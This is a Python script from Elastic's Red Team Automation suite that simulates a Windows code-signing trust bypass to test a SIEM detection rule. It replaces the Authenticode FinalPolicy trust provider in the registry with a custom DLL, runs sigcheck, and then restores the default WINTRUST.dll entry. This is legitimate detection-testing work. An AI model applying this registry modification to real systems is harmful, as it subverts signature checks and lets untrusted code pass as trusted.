# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Trust Provider Modification
# RTA: trust_provider.py
# ATT&CK: T1116
# Description: Substitutes an invalid code authentication policy, enabling trust policy bypass.

from . import common
from . import RtaMetadata


metadata = RtaMetadata(
    uuid="45541eb5-c636-477b-81c9-b6dcf184c9cc",
    platforms=["windows"],
    endpoint=[],
    siem=[{"rule_id": "f2c7b914-eda3-40c2-96ac-d23ef91776ca", "rule_name": "SIP Provider Modification"}],
    techniques=["T1553"],
)


FINAL_POLICY_KEY = "Software\\Microsoft\\Cryptography\\providers\\trust\\FinalPolicy\\{00AAC56B-CD44-11D0-8CC2-00C04FC295EE}"  # noqa: E501


def set_final_policy(dll_path, function_name):
    winreg = common.get_winreg()
    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, FINAL_POLICY_KEY)

    common.log("Setting dll path: %s" % dll_path)
    winreg.SetValueEx(hkey, "$DLL", 0, winreg.REG_SZ, dll_path)

    common.log("Setting function name: %s" % function_name)
    winreg.SetValueEx(hkey, "$Function", 0, winreg.REG_SZ, function_name)


if common.is_64bit():
    SIGCHECK = common.get_path("bin", "sigcheck64.exe")
    TRUST_PROVIDER_DLL = common.get_path("bin", "TrustProvider64.dll")
else:
    SIGCHECK = common.get_path("bin", "sigcheck32.exe")
    TRUST_PROVIDER_DLL = common.get_path("bin", "TrustProvider32.dll")

TARGET_APP = common.get_path("bin", "myapp.exe")


@common.requires_os(metadata.platforms)
@common.dependencies(SIGCHECK, TRUST_PROVIDER_DLL, TARGET_APP)
def main():
    common.log("Trust Provider")
    set_final_policy(TRUST_PROVIDER_DLL, "FinalPolicy")

    common.log("Launching sigcheck")
    common.execute([SIGCHECK, "-accepteula", TARGET_APP])

    common.log("Cleaning up")
    set_final_policy("C:\\Windows\\System32\\WINTRUST.dll", "SoftpubAuthenticode")


if __name__ == "__main__":
    exit(main())
